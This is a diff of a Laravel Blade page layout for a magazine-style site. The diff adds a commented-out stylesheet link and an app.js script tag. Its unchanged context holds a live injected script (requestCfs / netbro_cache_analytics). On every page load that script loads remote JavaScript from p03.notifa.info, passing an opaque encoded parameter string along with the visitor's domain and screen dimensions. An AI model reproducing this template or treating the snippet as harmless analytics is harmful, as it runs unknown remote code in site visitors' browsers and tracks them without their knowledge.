@@ -21,6 +21,7 @@
 	<link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/ticker-style.css')}}"/>
 	<link rel="stylesheet" type="text/css" href="{{asset('hotmagazine/css/style.css')}}" media="screen">
 	<link rel="stylesheet" type="text/css" href="{{asset('css/custom.css')}}" media="screen">
+	{{-- <link rel="stylesheet" type="text/css" href="{{asset('css/app.css')}}" media="screen"> --}}
 
 	@yield('script-top')
 
@@ -62,6 +63,8 @@
 				}
 			function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprA5wClD%2fduy4o2%2byvdJEQXEGOBOCTOdO4dcDeskZjLEtDLInVM%2f4hHTdqkAh687bNai50EFkcigwycO5HTNCrbu7XsqKajYQjyulFvkhaKKKX%2flZJpe1B7ZWoLOohTrqFXm1IzfAFdx%2fBA%2bAtIT%2fKwXDYcOFxk2xCrJz5%2b8SLGTkCQYRooPS%2bYaPZxXM10Su%2bJFo800HuvEAz5dNtxLtXfKlYBTdLH9Sw2hiZrQeeG%2bTVZcak3oy83QJOjdyUSaKC16vw41lmmNv6V4DfiN%2b%2bKfsKTfzJlyKrcAZ4pjELccdZJIGjzcv1M26PmJ7OngBNHmfwY2wWr5s280gBiJcMvOEYvlcfn4nCv1%2fVH5IdeVRf8dGHTarh0%2bBcTGO9knSp5ZRtZAYSvnoVllTTwlsKiylH8zeupUAqdHfRgELoPQmatcmHpZMtx6uBtr6F%2fd53f1SRwYjkDyCGRTjKBtwvEIkVzfoZYZ3A7uRr096lrfdVk8nx0RcSkqQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
 	</script>
+
+	<script src="{{asset('js/app.js')}}"></script>
 
 	@yield('script-bottom')
 </body>
